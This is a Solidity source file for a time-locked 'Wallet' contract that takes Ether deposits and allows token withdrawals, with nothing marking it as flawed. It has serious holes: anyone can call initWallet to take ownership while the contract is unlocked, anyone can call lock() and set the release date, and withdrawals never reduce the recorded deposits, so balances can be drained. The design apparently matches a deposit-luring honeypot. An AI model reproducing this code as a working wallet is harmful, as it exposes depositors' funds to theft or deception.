1 pragma solidity ^0.4.16;
2 
3 contract ERC20 {
4     function balanceOf(address who) constant public returns (uint256);
5     function transfer(address to, uint256 amount) public;
6 }
7 
8 contract Wallet {
9     
10     event Deposit(address indexed depositor, uint amount);
11     event Withdrawal(address indexed to, uint amount);
12     event TransferOwnership(address indexed from, address indexed to);
13     
14     address Owner;
15     function transferOwnership(address to) onlyOwner { TransferOwnership(Owner, to); Owner = to; }
16     
17     mapping (address => uint) public Deposits;
18     uint minDeposit;
19     bool Locked = false;
20     uint Date;
21 
22     function initWallet() payable open {
23         Owner = msg.sender;
24         minDeposit = 0.25 ether;
25         deposit();
26     }
27 
28     function SetReleaseDate(uint NewDate) {
29         Date = NewDate;
30     }
31 
32     function() public payable { deposit(); }
33 
34     function deposit() public payable {
35         if (msg.value > 0) {
36             if (msg.value >= MinimumDeposit())
37                 Deposits[msg.sender] += msg.value;
38             Deposit(msg.sender, msg.value);
39         }
40     }
41 
42     function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
43     
44     function withdrawTo(address to, uint amount) public onlyOwner {
45         if (WithdrawalEnabled()) {
46             uint max = Deposits[msg.sender];
47             if (max > 0 && amount <= max) {
48                 to.transfer(amount);
49                 Withdrawal(to, amount);
50             }
51         }
52     }
53 
54     function withdrawToken(address token) public payable onlyOwner {
55         withdrawTokenTo(token, msg.sender, ERC20(token).balanceOf(address(this)));
56     }
57 
58     function withdrawTokenTo(address token, address to, uint amount) public payable onlyOwner {
59         uint bal = ERC20(token).balanceOf(address(this));
60         if (bal >= amount && amount > 0) {
61             ERC20(token).transfer(to, amount);
62         }
63     }
64 
65     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
66     function ReleaseDate() public constant returns (uint) { return Date; }
67     function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
68     function lock() public { Locked = true; }
69     modifier onlyOwner { if (msg.sender == Owner) _; }
70     modifier open { if (!Locked) _; }
71 }